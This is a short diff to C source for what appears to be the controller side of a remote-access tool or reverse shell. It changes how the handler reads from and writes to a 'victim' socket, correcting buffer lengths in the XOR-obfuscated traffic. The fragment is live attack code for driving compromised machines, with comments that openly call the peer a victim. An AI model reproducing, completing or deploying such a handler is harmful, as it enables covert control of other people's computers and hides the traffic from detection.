@@ -68,9 +68,9 @@ void *Socket_Reader(){
     // Intercept incoming data from the current victim socket
     char buffer[MAXBUF];
     int n;
-    read(a.dest, buffer, 17);
-    char* xorhello = XOR(buffer, key, 17, keylen);
-    write(STDOUT_FILENO, xorhello, 17);
+    read(a.dest, buffer, 18);
+    char* xorhello = XOR(buffer, key, 18, keylen);
+    write(STDOUT_FILENO, xorhello, 18);
 
     fflush(NULL);
     while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
@@ -109,9 +109,9 @@ void *Socket_Writer()
             return NULL;
         } else {
 	
-	    char* xorbuffer = XOR(buffer, key, MAXBUF, keylen);
+	    char* xorbuffer = XOR(buffer, key, n, keylen);
 
-            write(a.dest, xorbuffer, MAXBUF); // writes to victim file descriptor. clientfd is passed to a.dest on line 12
+            write(a.dest, xorbuffer, n); // writes to victim file descriptor. clientfd is passed to a.dest on line 12
         }
     }
 
